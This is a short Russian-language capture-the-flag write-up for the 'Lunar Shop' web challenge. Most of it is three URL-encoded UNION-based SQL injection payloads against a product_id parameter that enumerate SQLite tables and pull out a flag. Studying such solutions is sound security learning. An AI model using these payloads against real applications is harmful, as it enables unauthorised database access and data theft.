# Lunar Shop — SQLi Writeup

## TL;DR
В параметре `product_id` есть UNION-based / error-based SQLi. Таблиц -- смотрим в `sqlite_master`, затем вытаскиваем CREATE TABLE и значение флага.

## PoC — payloads
1) Посмотреть список таблиц:
```
/product?product_id=1%20UNION%20SELECT%201%2Cname%2C3%2C4%20FROM%20sqlite_master%20WHERE%20type%3D'table'%20--%20
```

2) Посмотреть CREATE TABLE:
```
/product?product_id=1%20UNION%20SELECT%201%2Csql%2C3%2C4%20FROM%20sqlite_master%20WHERE%20type%3D'table'%20--%20
```

3) Вытянуть флаг (если таблица `flag`, столбец `flag`):
```
/product?product_id=1%20UNION%20SELECT%201%2C3%2C4%2C(SELECT%20flag%20FROM%20flag%20LIMIT%201)%20--%20
```

## Пример результата
```
sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}
```


